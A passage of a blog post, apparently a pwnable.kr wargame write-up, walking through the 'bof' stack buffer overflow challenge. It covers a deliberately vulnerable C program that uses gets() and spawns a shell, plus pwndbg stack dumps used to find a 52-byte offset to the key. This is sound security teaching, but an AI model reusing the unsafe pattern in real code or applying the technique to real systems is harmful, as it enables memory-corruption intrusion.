@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>bof</title>
+  <style>
+    code{white-space: pre-wrap;}
+    span.smallcaps{font-variant: small-caps;}
+    div.columns{display: flex; gap: min(4vw, 1.5em);}
+    div.column{flex: auto; overflow-x: auto;}
+    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+    /* The extra [class] is a hack that increases specificity enough to
+       override a similar rule in reveal.js */
+    ul.task-list[class]{list-style: none;}
+    ul.task-list li input[type="checkbox"] {
+      font-size: inherit;
+      width: 0.8em;
+      margin: 0 0.8em 0.2em -1.6em;
+      vertical-align: middle;
+    }
+    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
+    /* CSS for syntax highlighting */
+    html { -webkit-text-size-adjust: 100%; }
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    .sourceCode { overflow: visible; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        background-color: #232629;
+        color: #7a7c7d;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+    div.sourceCode
+      { color: #cfcfc2; background-color: #232629; }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span { color: #cfcfc2; } /* Normal */
+    code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+    code span.an { color: #3f8058; } /* Annotation */
+    code span.at { color: #2980b9; } /* Attribute */
+    code span.bn { color: #f67400; } /* BaseN */
+    code span.bu { color: #7f8c8d; } /* BuiltIn */
+    code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #3daee9; } /* Char */
+    code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+    code span.co { color: #7a7c7d; } /* Comment */
+    code span.cv { color: #7f8c8d; } /* CommentVar */
+    code span.do { color: #a43340; } /* Documentation */
+    code span.dt { color: #2980b9; } /* DataType */
+    code span.dv { color: #f67400; } /* DecVal */
+    code span.er { color: #da4453; text-decoration: underline; } /* Error */
+    code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+    code span.fl { color: #f67400; } /* Float */
+    code span.fu { color: #8e44ad; } /* Function */
+    code span.im { color: #27ae60; } /* Import */
+    code span.in { color: #c45b00; } /* Information */
+    code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+    code span.op { color: #cfcfc2; } /* Operator */
+    code span.ot { color: #27ae60; } /* Other */
+    code span.pp { color: #27ae60; } /* Preprocessor */
+    code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+    code span.sc { color: #3daee9; } /* SpecialChar */
+    code span.ss { color: #da4453; } /* SpecialString */
+    code span.st { color: #f44f4f; } /* String */
+    code span.va { color: #27aeae; } /* Variable */
+    code span.vs { color: #da4453; } /* VerbatimString */
+    code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+        <header>
+            <h1>ethan grassia</h1>
+            <nav>
+                <a href="/index.html">home</a>
+                <a href="/blog/index.html">blog</a>
+            </nav>
+        </header>
+        <hr>
+<p>04-25-2026 | <i>pwnable.kr series</i></p>
+<h1 id="bof">bof</h1>
+<p>a buffer overflow is a common exploit that involves writing more data
+to a fixed-size array than it can hold. the consequence is that data
+stored in adjacent memory to the array is overwritten/corrupted, which
+can alter the flow of the program. this simple program demonstrates the
+concept:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode numberSource c numberLines"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb1-4"><a href="#cb1-4"></a><span class="dt">void</span> func<span class="op">(</span><span class="dt">int</span> key<span class="op">){</span></span>
+<span id="cb1-5"><a href="#cb1-5"></a>        <span class="dt">char</span> overflowme<span class="op">[</span><span class="dv">32</span><span class="op">];</span></span>
+<span id="cb1-6"><a href="#cb1-6"></a>        printf<span class="op">(</span><span class="st">&quot;overflow me : &quot;</span><span class="op">);</span></span>
+<span id="cb1-7"><a href="#cb1-7"></a>        gets<span class="op">(</span>overflowme<span class="op">);</span>       <span class="co">// smash me!</span></span>
+<span id="cb1-8"><a href="#cb1-8"></a>        <span class="cf">if</span><span class="op">(</span>key <span class="op">==</span> <span class="bn">0xcafebabe</span><span class="op">){</span></span>
+<span id="cb1-9"><a href="#cb1-9"></a>                setregid<span class="op">(</span>getegid<span class="op">(),</span> getegid<span class="op">());</span></span>
+<span id="cb1-10"><a href="#cb1-10"></a>                system<span class="op">(</span><span class="st">&quot;/bin/sh&quot;</span><span class="op">);</span></span>
+<span id="cb1-11"><a href="#cb1-11"></a>        <span class="op">}</span></span>
+<span id="cb1-12"><a href="#cb1-12"></a>        <span class="cf">else</span><span class="op">{</span></span>
+<span id="cb1-13"><a href="#cb1-13"></a>                printf<span class="op">(</span><span class="st">&quot;Nah..</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-14"><a href="#cb1-14"></a>        <span class="op">}</span></span>
+<span id="cb1-15"><a href="#cb1-15"></a><span class="op">}</span></span>
+<span id="cb1-16"><a href="#cb1-16"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">*</span> argv<span class="op">[]){</span></span>
+<span id="cb1-17"><a href="#cb1-17"></a>        func<span class="op">(</span><span class="bn">0xdeadbeef</span><span class="op">);</span></span>
+<span id="cb1-18"><a href="#cb1-18"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb1-19"><a href="#cb1-19"></a><span class="op">}</span></span></code></pre></div>
+<p><code>func()</code> takes the argument <code>0xdeadbeef</code> and
+opens a shell if that value somehow changes to <code>0xcafebabe</code>.
+normally, arguments passed to a function should be safe from outside
+modification. however, the unsafe <code>gets()</code> is used
+here—<code>gets()</code> reads from the standard input into a buffer
+until it reaches a newline or EOF, without checking for an input size.
+thus, any data written past the buffer will clobber adjacent memory.
+we’ll use gdb/pwndbg to examine the disassembly of <code>func()</code>
+and see if <code>key</code> is in harm’s way.</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>$ gdb -q bof</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; b gets</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>Breakpoint 1 at 0x1060</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; r</span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>Starting program: /home/bof/bof</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="co">[</span><span class="ot">Thread debugging using libthread_db enabled</span><span class="co">]</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>Breakpoint 1, _IO_gets (buf=0xffffd4fc &quot;\204\326\377\377&quot;) at ./libio/iogets.c:32</span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>32  ./libio/iogets.c: No such file or directory.</span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>Disabling the emulation via Unicorn Engine that is used for computing branches as there isn&#39;t enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:</span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="ss">* </span>https://github.com/pwndbg/pwndbg/issues/1534</span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a><span class="ss">* </span>https://github.com/unicorn-engine/unicorn/pull/1743</span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>Either free your memory or explicitly set <span class="in">`set emulate off`</span> in your Pwndbg config</span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a>──────────────────────────────<span class="co">[</span><span class="ot"> REGISTERS / show-flags off / show-compact-regs off </span><span class="co">]</span>──────────────────────────────</span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a> EAX  0xffffd4fc —▸ 0xffffd684 ◂— 0x20 /* &#39; &#39; */</span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a> EBX  0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3efc</span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a> ECX  0x56557016 ◂— 0x69622f00</span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a> EDX  0</span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a> ESI  0xffffd614 —▸ 0xffffd75b ◂— &#39;/home/bof/bof&#39;</span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a> EBP  0xffffd528 —▸ 0xffffd548 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...</span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a> ESP  0xffffd4dc —▸ 0x56556239 (func+60) ◂— add esp, 0x10</span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a> EIP  0xf7def8f0 (gets) ◂— endbr32</span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────<span class="co">[</span><span class="ot"> DISASM / i386 / set emulate off </span><span class="co">]</span>────────────────────────────────────────</span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a> ► 0xf7def8f0 <span class="dt">&lt;</span><span class="kw">gets</span><span class="dt">&gt;</span>       endbr32</span>
+<span id="cb2-28"><a href="#cb2-28" aria-hidden="true" tabindex="-1"></a>   0xf7def8f4 &lt;gets+4&gt;     push   ebp</span>
+<span id="cb2-29"><a href="#cb2-29" aria-hidden="true" tabindex="-1"></a>   0xf7def8f5 &lt;gets+5&gt;     mov    ebp, esp</span>
+<span id="cb2-30"><a href="#cb2-30" aria-hidden="true" tabindex="-1"></a>   0xf7def8f7 &lt;gets+7&gt;     push   edi</span>
+<span id="cb2-31"><a href="#cb2-31" aria-hidden="true" tabindex="-1"></a>   0xf7def8f8 &lt;gets+8&gt;     call   __x86.get_pc_thunk.di       &lt;__x86.get_pc_thunk.di&gt;</span>
+<span id="cb2-32"><a href="#cb2-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-33"><a href="#cb2-33" aria-hidden="true" tabindex="-1"></a>   0xf7def8fd &lt;gets+13&gt;    add    edi, 0x1b7703</span>
+<span id="cb2-34"><a href="#cb2-34" aria-hidden="true" tabindex="-1"></a>   0xf7def903 &lt;gets+19&gt;    push   esi</span>
+<span id="cb2-35"><a href="#cb2-35" aria-hidden="true" tabindex="-1"></a>   0xf7def904 &lt;gets+20&gt;    push   ebx</span>
+<span id="cb2-36"><a href="#cb2-36" aria-hidden="true" tabindex="-1"></a>   0xf7def905 &lt;gets+21&gt;    sub    esp, 0x1c</span>
+<span id="cb2-37"><a href="#cb2-37" aria-hidden="true" tabindex="-1"></a>   0xf7def908 &lt;gets+24&gt;    mov    ebx, dword ptr <span class="co">[</span><span class="ot">edi - 0x70</span><span class="co">]</span></span>
+<span id="cb2-38"><a href="#cb2-38" aria-hidden="true" tabindex="-1"></a>   0xf7def90e &lt;gets+30&gt;    mov    esi, dword ptr <span class="co">[</span><span class="ot">ebx</span><span class="co">]</span></span>
+<span id="cb2-39"><a href="#cb2-39" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────<span class="co">[</span><span class="ot"> STACK </span><span class="co">]</span>─────────────────────────────────────────────────────</span>
+<span id="cb2-40"><a href="#cb2-40" aria-hidden="true" tabindex="-1"></a>00:0000│ esp 0xffffd4dc —▸ 0x56556239 (func+60) ◂— add esp, 0x10</span>
+<span id="cb2-41"><a href="#cb2-41" aria-hidden="true" tabindex="-1"></a>01:0004│-048 0xffffd4e0 —▸ 0xffffd4fc —▸ 0xffffd684 ◂— 0x20 /* &#39; &#39; */</span>
+<span id="cb2-42"><a href="#cb2-42" aria-hidden="true" tabindex="-1"></a>02:0008│-044 0xffffd4e4 ◂— 0xffffffff</span>
+<span id="cb2-43"><a href="#cb2-43" aria-hidden="true" tabindex="-1"></a>03:000c│-040 0xffffd4e8 —▸ 0x56555034 ◂— 6</span>
+<span id="cb2-44"><a href="#cb2-44" aria-hidden="true" tabindex="-1"></a>04:0010│-03c 0xffffd4ec —▸ 0x5655620a (func+13) ◂— add ebx, 0x2df6</span>
+<span id="cb2-45"><a href="#cb2-45" aria-hidden="true" tabindex="-1"></a>05:0014│-038 0xffffd4f0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span>
+<span id="cb2-46"><a href="#cb2-46" aria-hidden="true" tabindex="-1"></a>06:0018│-034 0xffffd4f4 ◂— 0x20 /* &#39; &#39; */</span>
+<span id="cb2-47"><a href="#cb2-47" aria-hidden="true" tabindex="-1"></a>07:001c│-030 0xffffd4f8 ◂— 0</span>
+<span id="cb2-48"><a href="#cb2-48" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────<span class="co">[</span><span class="ot"> BACKTRACE </span><span class="co">]</span>───────────────────────────────────────────────────</span>
+<span id="cb2-49"><a href="#cb2-49" aria-hidden="true" tabindex="-1"></a> ► 0 0xf7def8f0 gets</span>
+<span id="cb2-50"><a href="#cb2-50" aria-hidden="true" tabindex="-1"></a>   1 0x56556239 func+60</span>
+<span id="cb2-51"><a href="#cb2-51" aria-hidden="true" tabindex="-1"></a>   2 0x565562c5 main+40</span>
+<span id="cb2-52"><a href="#cb2-52" aria-hidden="true" tabindex="-1"></a>   3 0xf7d9e519 __libc_start_call_main+121</span>
+<span id="cb2-53"><a href="#cb2-53" aria-hidden="true" tabindex="-1"></a>   4 0xf7d9e5f3 __libc_start_main+147</span>
+<span id="cb2-54"><a href="#cb2-54" aria-hidden="true" tabindex="-1"></a>   5 0x565560fb _start+43</span>
+<span id="cb2-55"><a href="#cb2-55" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb2-56"><a href="#cb2-56" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; x/32xw $esp</span>
+<span id="cb2-57"><a href="#cb2-57" aria-hidden="true" tabindex="-1"></a>0xffffd4dc: 0x56556239  0xffffd4fc  0xffffffff  0x56555034</span>
+<span id="cb2-58"><a href="#cb2-58" aria-hidden="true" tabindex="-1"></a>0xffffd4ec: 0x5655620a  0xf7ffd608  0x00000020  0x00000000</span>
+<span id="cb2-59"><a href="#cb2-59" aria-hidden="true" tabindex="-1"></a>0xffffd4fc: 0xffffd684  0x00000000  0x00000000  0x01000000</span>
+<span id="cb2-60"><a href="#cb2-60" aria-hidden="true" tabindex="-1"></a>0xffffd50c: 0x0000000b  0xf7fc4540  0x00000000  0xf7d954be</span>
+<span id="cb2-61"><a href="#cb2-61" aria-hidden="true" tabindex="-1"></a>0xffffd51c: 0x8bafe300  0xf7fa7000  0xffffd614  0xffffd548</span>
+<span id="cb2-62"><a href="#cb2-62" aria-hidden="true" tabindex="-1"></a>0xffffd52c: 0x565562c5  0xdeadbeef  0xf7fbe66c  0xf7fbeb30</span>
+<span id="cb2-63"><a href="#cb2-63" aria-hidden="true" tabindex="-1"></a>0xffffd53c: 0x565562b3  0x00000001  0xffffd560  0xf7ffd020</span>
+<span id="cb2-64"><a href="#cb2-64" aria-hidden="true" tabindex="-1"></a>0xffffd54c: 0xf7d9e519  0xffffd75b  0x00000070  0xf7ffd000</span></code></pre></div>
+<p>I’ve set a breakpoint at the start of <code>gets()</code> and run the
+program to reach it at <code>0xf7def8f0</code>. the command
+<code>x/32xw $esp</code> dumps 32 4-byte words starting at the address
+held in the stack pointer register, which gives us a glimpse of the
+current stack frame. at this point, we can see <code>0xdeadbeef</code>
+at address <code>0xffffd530</code>—this is <code>key</code>.</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; fin</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>Run till exit from #0  _IO_gets (buf=0xffffd4fc &quot;\204\326\377\377&quot;) at ./libio/iogets.c:32</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>overflow me : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>0x56556239 in func ()</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>Value returned is $1 = 0xffffd4fc &#39;A&#39; <span class="dt">&lt;</span><span class="kw">repeats</span><span class="ot"> </span><span class="er">32</span><span class="ot"> times</span><span class="dt">&gt;</span></span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>──────────────────────────────<span class="co">[</span><span class="ot"> REGISTERS / show-flags off / show-compact-regs off </span><span class="co">]</span>──────────────────────────────</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a> EAX  0xffffd4fc ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a> EBX  0x56559000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3efc</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>*ECX  0xf7fa89c0 (_IO_stdfile_0_lock) ◂— 0</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>*EDX  1</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a> ESI  0xffffd614 —▸ 0xffffd75b ◂— &#39;/home/bof/bof&#39;</span>
+<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a> EBP  0xffffd528 —▸ 0xffffd548 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— ...</span>
+<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>*ESP  0xffffd4e0 —▸ 0xffffd4fc ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>*EIP  0x56556239 (func+60) ◂— add esp, 0x10</span>
+<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────<span class="co">[</span><span class="ot"> DISASM / i386 / set emulate off </span><span class="co">]</span>────────────────────────────────────────</span>
+<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a> ► 0x56556239 &lt;func+60&gt;    add    esp, 0x10                           ESP =&gt; 0xffffd4e0 + 0x10</span>
+<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>   0x5655623c &lt;func+63&gt;    cmp    dword ptr <span class="co">[</span><span class="ot">ebp + 8</span><span class="co">]</span>, 0xcafebabe</span>
+<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>   0x56556243 &lt;func+70&gt;    jne    func+117                    &lt;func+117&gt;</span>
+<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>   0x56556245 &lt;func+72&gt;    call   getegid@plt                 &lt;getegid@plt&gt;</span>
+<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>   0x5655624a &lt;func+77&gt;    mov    esi, eax</span>
+<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>   0x5655624c &lt;func+79&gt;    call   getegid@plt                 &lt;getegid@plt&gt;</span>
+<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a>   0x56556251 &lt;func+84&gt;    sub    esp, 8</span>
+<span id="cb3-28"><a href="#cb3-28" aria-hidden="true" tabindex="-1"></a>   0x56556254 &lt;func+87&gt;    push   esi</span>
+<span id="cb3-29"><a href="#cb3-29" aria-hidden="true" tabindex="-1"></a>   0x56556255 &lt;func+88&gt;    push   eax</span>
+<span id="cb3-30"><a href="#cb3-30" aria-hidden="true" tabindex="-1"></a>   0x56556256 &lt;func+89&gt;    call   setregid@plt                &lt;setregid@plt&gt;</span>
+<span id="cb3-31"><a href="#cb3-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-32"><a href="#cb3-32" aria-hidden="true" tabindex="-1"></a>   0x5655625b &lt;func+94&gt;    add    esp, 0x10</span>
+<span id="cb3-33"><a href="#cb3-33" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────<span class="co">[</span><span class="ot"> STACK </span><span class="co">]</span>─────────────────────────────────────────────────────</span>
+<span id="cb3-34"><a href="#cb3-34" aria-hidden="true" tabindex="-1"></a>00:0000│ esp 0xffffd4e0 —▸ 0xffffd4fc ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+<span id="cb3-35"><a href="#cb3-35" aria-hidden="true" tabindex="-1"></a>01:0004│-044 0xffffd4e4 ◂— 0xffffffff</span>
+<span id="cb3-36"><a href="#cb3-36" aria-hidden="true" tabindex="-1"></a>02:0008│-040 0xffffd4e8 —▸ 0x56555034 ◂— 6</span>
+<span id="cb3-37"><a href="#cb3-37" aria-hidden="true" tabindex="-1"></a>03:000c│-03c 0xffffd4ec —▸ 0x5655620a (func+13) ◂— add ebx, 0x2df6</span>
+<span id="cb3-38"><a href="#cb3-38" aria-hidden="true" tabindex="-1"></a>04:0010│-038 0xffffd4f0 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span>
+<span id="cb3-39"><a href="#cb3-39" aria-hidden="true" tabindex="-1"></a>05:0014│-034 0xffffd4f4 ◂— 0x20 /* &#39; &#39; */</span>
+<span id="cb3-40"><a href="#cb3-40" aria-hidden="true" tabindex="-1"></a>06:0018│-030 0xffffd4f8 ◂— 0</span>
+<span id="cb3-41"><a href="#cb3-41" aria-hidden="true" tabindex="-1"></a>07:001c│ eax 0xffffd4fc ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>
+<span id="cb3-42"><a href="#cb3-42" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────<span class="co">[</span><span class="ot"> BACKTRACE </span><span class="co">]</span>───────────────────────────────────────────────────</span>
+<span id="cb3-43"><a href="#cb3-43" aria-hidden="true" tabindex="-1"></a> ► 0 0x56556239 func+60</span>
+<span id="cb3-44"><a href="#cb3-44" aria-hidden="true" tabindex="-1"></a>   1 0x565562c5 main+40</span>
+<span id="cb3-45"><a href="#cb3-45" aria-hidden="true" tabindex="-1"></a>   2 0xf7d9e519 __libc_start_call_main+121</span>
+<span id="cb3-46"><a href="#cb3-46" aria-hidden="true" tabindex="-1"></a>   3 0xf7d9e5f3 __libc_start_main+147</span>
+<span id="cb3-47"><a href="#cb3-47" aria-hidden="true" tabindex="-1"></a>   4 0x565560fb _start+43</span>
+<span id="cb3-48"><a href="#cb3-48" aria-hidden="true" tabindex="-1"></a>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span id="cb3-49"><a href="#cb3-49" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; x/32xw $esp</span>
+<span id="cb3-50"><a href="#cb3-50" aria-hidden="true" tabindex="-1"></a>0xffffd4e0: 0xffffd4fc  0xffffffff  0x56555034  0x5655620a</span>
+<span id="cb3-51"><a href="#cb3-51" aria-hidden="true" tabindex="-1"></a>0xffffd4f0: 0xf7ffd608  0x00000020  0x00000000  0x41414141</span>
+<span id="cb3-52"><a href="#cb3-52" aria-hidden="true" tabindex="-1"></a>0xffffd500: 0x41414141  0x41414141  0x41414141  0x41414141</span>
+<span id="cb3-53"><a href="#cb3-53" aria-hidden="true" tabindex="-1"></a>0xffffd510: 0x41414141  0x41414141  0x41414141  0x8bafe300</span>
+<span id="cb3-54"><a href="#cb3-54" aria-hidden="true" tabindex="-1"></a>0xffffd520: 0xf7fa7000  0xffffd614  0xffffd548  0x565562c5</span>
+<span id="cb3-55"><a href="#cb3-55" aria-hidden="true" tabindex="-1"></a>0xffffd530: 0xdeadbeef  0xf7fbe66c  0xf7fbeb30  0x565562b3</span>
+<span id="cb3-56"><a href="#cb3-56" aria-hidden="true" tabindex="-1"></a>0xffffd540: 0x00000001  0xffffd560  0xf7ffd020  0xf7d9e519</span>
+<span id="cb3-57"><a href="#cb3-57" aria-hidden="true" tabindex="-1"></a>0xffffd550: 0xffffd75b  0x00000070  0xf7ffd000  0xf7d9e519</span></code></pre></div>
+<p>there’s a lot of noise from pwndbg, but all I’ve done here is execute
+the rest of <code>gets()</code> with the <code>fin</code> command to
+read from standard input, then filled <code>overflowme</code> with 32
+bytes. this lets us see where the initialized data in the buffer is
+stored relative to <code>key</code>, which is not very far away.</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode markdown"><code class="sourceCode markdown"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; x/32xw $esp</span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>0xffffd4e0: 0xffffd4fc  0xffffffff  0x56555034  0x5655620a</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>0xffffd4f0: 0xf7ffd608  0x00000020  0x00000000  0x41414141</span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>0xffffd500: 0x41414141  0x41414141  0x41414141  0x41414141</span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>0xffffd510: 0x41414141  0x41414141  0x41414141  0xd0b49c00</span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>0xffffd520: 0xf7fa7000  0xffffd614  0xffffd548  0x565562c5</span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>0xffffd530: 0xdeadbeef  0xf7fbe66c  0xf7fbeb30  0x565562b3</span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>0xffffd540: 0x00000001  0xffffd560  0xf7ffd020  0xf7d9e519</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>0xffffd550: 0xffffd75b  0x00000070  0xf7ffd000  0xf7d9e519</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>pwndbg&gt; p 0xffffd530 - 0xffffd4fc</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>$1 = 52</span></code></pre></div>
